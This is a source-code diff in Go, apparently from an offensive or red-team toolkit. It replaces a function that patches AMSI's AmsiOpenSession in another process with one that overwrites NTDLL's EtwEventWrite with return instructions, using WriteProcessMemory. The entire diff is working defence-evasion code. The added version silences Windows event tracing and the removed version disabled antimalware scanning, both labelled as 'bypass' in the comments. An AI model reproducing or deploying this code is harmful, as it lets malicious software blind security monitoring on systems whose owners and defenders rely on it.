@@ -7,25 +7,18 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-const (
-	PROCESS_VM_OPERATION uint32 = 0x0008
-	PROCESS_VM_WRITE     uint32 = 0x0020
-)
-
-// Amsi bypass by injecting into the provided PID
-// and overwriting the AMSI.AmsiOpenSession function
-func PatchAmsi(pid int) error {
+// ETW bypass by injecting into the provided PID
+// and overwriting the NTDLL.EtwEventWrite function
+func PatchETW(pid int) error {
 	// Payload to inject into the function
-	// xor rax, rax
+	// ret
 	// bytes for 64bit process
-	newBytes := []byte{0x48, 0x31, 0xC0}
+	newBytes := []byte{0xc3}
 
-	// xor eax, eax
-	// 33 C0
-	// kept the first few instructions before the je instruction
+	// ret 14
 	// bytes for 32bit process
 	if IsWOW64Process() {
-		newBytes = []byte{0x8B, 0xFF, 0x55, 0x8B, 0xEC, 0x8B, 0x4D, 0x0C, 0x33, 0xC0}
+		newBytes = []byte{0xc2, 0x14, 0x00, 0x00}
 	}
 
 	lbytes := uintptr(len(newBytes))
@@ -42,16 +35,16 @@ func PatchAmsi(pid int) error {
 		return errors.New(rs)
 	}
 
-	/// Load amsi.dll into the process
-	amsi := windows.NewLazySystemDLL("amsi.dll")
-	amsiOpenSession := amsi.NewProc("AmsiOpenSession")
+	/// Load ntdll.dll into the process
+	ntdll := windows.NewLazySystemDLL("ntdll.dll")
+	etwEventWrite := ntdll.NewProc("EtwEventWrite")
 
 	// Write the payload
 	// BOOL WriteProcessMemory(HANDLE  hProcess, LPVOID  lpBaseAddress, LPCVOID lpBuffer, SIZE_T  nSize, SIZE_T  *lpNumberOfBytesWritten);
 	var bytesWritten uintptr
-	err = windows.WriteProcessMemory(procHandle, amsiOpenSession.Addr(), &newBytes[0], lbytes, &bytesWritten)
+	err = windows.WriteProcessMemory(procHandle, etwEventWrite.Addr(), &newBytes[0], lbytes, &bytesWritten)
 	if err != nil {
-		rs := fmt.Sprintf("Failed to patch AMSI.AmsiOpenSession in process with PID: %d\n", pid)
+		rs := fmt.Sprintf("Failed to patch NTDLL.EtwEventWrite in process with PID: %d\n", pid)
 		return errors.New(rs)
 	}
 
